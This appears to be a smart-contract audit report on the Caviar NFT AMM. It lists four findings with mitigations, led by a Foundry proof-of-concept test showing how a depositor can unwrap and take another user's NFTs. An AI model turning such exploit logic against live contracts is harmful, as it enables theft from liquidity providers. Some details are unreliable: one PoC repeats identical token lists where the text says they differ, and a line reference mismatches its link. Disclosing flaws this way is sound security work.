# 1. `unwrap` function in `Pair.sol` can be exploited by a malicious user to exchange less expensive NFT's for more expensive ones in the pool

## Risk Classifcation

High

---

## Lines of Code

[Pair.sol Line 248](https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L248)

---

## Vulnerability Details

### Impact

`nftRemove` function burns `lpTokens` and releases `baseTokenAmount` and `fractionalTokenAmount` and then burns the `fractionalTokenAmount` to unwrap the NFT that is released back to the sender. At the time of unwrapping, code does not check if the `tokenIds` submitted by a LP correspond to the `tokenIds` submitted when the LP first minted fractional tokens. As a result, LP can submit any set of `tokenIds` as long as he has necessary amount of `fractional tokens` in his wallet at the time of unwrap

Since the `fractionalTokenAmounts` minted for every NFT is the same (1e18) -> a malicious user can deposit less valuable NFTs and exchange them for more valuable ones -> this will lead to a continuous price arbitrage where bots can dump lowest priced NFTs and exchange them from higher priced ones to generate instant profits.

Such an exploit is a serious risk to the credibility of protocol. Hence I've marked it as HIGH risk.

### Proof of Concept

I have modified existing test case to demonstrate how `babe` account NFTs (with token id 3 and 4 initially) can be grabbed by 'test' contract who had initially deposited token Ids 1 and 2. Assuming P1 + P2 < P3 + P4, there is an unfair value transfer happening from `babe` to `test` via `Caviar` protocol.

```
contract UnwrapTest is Fixture {
event Unwrap(uint256[] tokenIds);

// uint256[] public tokenIds;
uint256[] public user1TokenIds;
uint256[] public user2TokenIds;

// bytes32[][] public proofs;
bytes32[][] public proofs1;
bytes32[][] public proofs2;

Pair public pair;

function setUp() public {

    for (uint256 i = 0; i < 2; i++) {
        bayc.mint(address(this), i);
        tokenIds.push(i);
        user1TokenIds.push(i);
    }

    vm.startPrank(babe);
    for (uint256 j = 2; j < 4; j++) {
        bayc.mint(address(babe), j);
        tokenIds.push(j);
        user2TokenIds.push(j);
    }
    vm.stopPrank();

    for(uint256 k=0; k<4; k++){
        console.log("bayc owner of token", tokenIds[k], bayc.ownerOf(tokenIds[k]));
    }
    pair = createPairScript.create(address(bayc), address(usd), "YEET-mids.json", address(c));
    // proofs = createPairScript.generateMerkleProofs("YEET-mids.json", tokenIds);
    proofs1 = createPairScript.generateMerkleProofs("YEET-mids.json", user1TokenIds);
    proofs2 = createPairScript.generateMerkleProofs("YEET-mids.json", user2TokenIds);
    bayc.setApprovalForAll(address(pair), true);
    pair.wrap(user1TokenIds, proofs1);

    vm.startPrank(babe);
    bayc.setApprovalForAll(address(pair), true);
    pair.wrap(user2TokenIds, proofs2);
    vm.stopPrank();
}

function testItTransfersRandomTokens() public {

    // act
   // NOTE - test contract is sending `babe` minted NFT token Id's for unwrapping
  // exploiter can replace more expensive NFTs with less expensive ones
    pair.unwrap(user2TokenIds);

    // assert
    // asserting ownership change - which is successful
    for (uint256 i = 0; i < user2TokenIds.length; i++) {
        console.log("owner of token", user2TokenIds[i], bayc.ownerOf(user2TokenIds[i]));
        assertEq(bayc.ownerOf(user2TokenIds[i]), address(this), "Should have sent bayc to sender");
    }
}
}
```

### Recommended Mitigation Steps

- `Pairs` contract needs to keep a record of tokenIds submitted by each LP. This can easily be done by keep a mapping (address -> tokenId[])

- When `nftRemove` is called with an array of `tokenId[]`, code should check if the submitted tokenIds are same as the ones deposited during minting

Since all NFT's are unique and have their own price, it is only fair for protocol to protect that uniqueness. For long term credibility, it is imperative for protocol to give back the NFT to its rightful owner.

# 2. Malicious user can create multiple pools for same NFT/base token pair by changing merkle roots leading to duplicate LP tokens

## Risk Classifcation

Medium

---

## Lines of Code

[Caviar.sol Line 28](https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Caviar.sol#L28)

[Pair.sol Line 46](https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L46)

[LpToken.sol Line 13](https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/LpToken.sol#L13)

---

## Vulnerability Details

### Impact

Creating a new AMM pool needs a unique combination of `NFT`, `BaseToken` and `MerkleRoot`.

On creating a new AMM pool, a LP token is created whose `name` is string concatenation of `pair symbol` and `LP token` as defined [in Line 13 of LpToken.sol](https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/LpToken.sol#L13). Same convention is followed for `symbol`.

Note that key LP token identifiers (`name` & `symbol`) are common for AMM pools sharing same NFT/BaseToken but different `merkleroots`. And a malicious user can create (effectively) unlimited subsets of existing token Id's to create different `merkleroots`. Also note that the only way to destroy a pair mapping is by calling `destroy` function in `Caviar.sol` which can only be called by the `pair` contract itself.

Initiating a call by the `pair` contract would mean that `close` function needs to be called by `Caviar` owner which comes with a timelock. This makes response to an attacker slow & can potentially flood the protocol with duplicate pools

Since this can significantly degrade the user experience (although not causing any material loss of tokens), I've marked it as MEDIUM risk

### Proof of Concept

Bob creates a `Azuki`/`USDC` AMM pool by creating a merkle root that uses token ID's

```
"tokenIds": [
   "2678",
   "9196",
   "7832",
   "416",
   "5351",
   "262",
]
```

Bob creates a second `Azuki`/`USDC` AMM pool by creating a merkle root that uses token ID's

```
"tokenIds": [
   "2678",
   "9196",
   "7832",
   "416",
   "5351",
   "262",
]
```

Both have identical looking LP tokens but with different addresses.

### Recommended Mitigation Steps

Can be multiple ways of mitigating the risk of duplicate pools

- Whitelist users who can create new pools
- Check if LP token with same name is already issued - if yes, then prevent users from creating duplicate pools

# 3. No validation check on NFT address while creating a new pool

## Risk Classifcation

Medium

---

## Lines of Code

[Caviar.sol Line 197](https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Caviar.sol#L28)

---

## Vulnerability Details

### Impact

Any address, zero address or wallet address or a non-NFT contract address can be used to create a pool. A malicious user can create an (effectively) unlimited set of pools by assigning random addresses with `bytes32(0)` as merkle root. Note that each pool pair mapping can only be destroyed by `pair` contract itself when `caviar` owner calls the `close` function on `pair`.

Having a large number of dysfunctional pools with no liquidity can make the front-end complicated & an unnecessary list of events that need to be continuously filtered.

### Proof of Concept

Bob uses a random wallet address as nft address, `0x151777183602edb83519f0a0598500a9d2ee41a5` and `0xCAFE000000000000000000000000000000000000` as base token. Pair contract and LP token with name `0x151777183602edb83519f0a0598500a9d2ee41a5 fractional token` and symbol `f0x1517` get created.

Bob can create a large number of random pools by sending randomly generated wallet addresses that are not ERC721s

### Recommended Mitigation Steps

Recommend one or all the below checks in sequence:

- As a first check, check for zero address
- As a second check, you can also check for `codesize`

```
assembly { size := extcodesize(nft) };
require(size > 0, "!contract");
```

- As a third check, you can check if address supports IERC721 interfaceid

```
require(IERC165(from).supportsInterface(type(IERC721).interfaceId), "!ERC721");
```

# 4. QA Report

## Risk Classifcation

Low

---

## Vulnerability Details

### Impact

removeQuote`is called when user tries to remove liquidity from the pair. Calling`remove` on a pool with 0 LP token supply leads to a panic error (division by 0)

Formula in `removeQuote` on [Line 437](https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L437) leads to a division by 0 error when called on an empty pool with no LP tokens currently issued

### Recommended Mitigation Steps

Check if supply >0 by adding `assert`.

```
function removeQuote(uint256 lpTokenAmount) public view returns (uint256, uint256) {
    uint256 lpTokenSupply = lpToken.totalSupply();
    assert(lpTokenSupply >0);
    uint256 baseTokenOutputAmount = (baseTokenReserves() * lpTokenAmount) / lpTokenSupply;
    uint256 fractionalTokenOutputAmount = (fractionalTokenReserves() * lpTokenAmount) / lpTokenSupply;

    return (baseTokenOutputAmount, fractionalTokenOutputAmount);
}
```
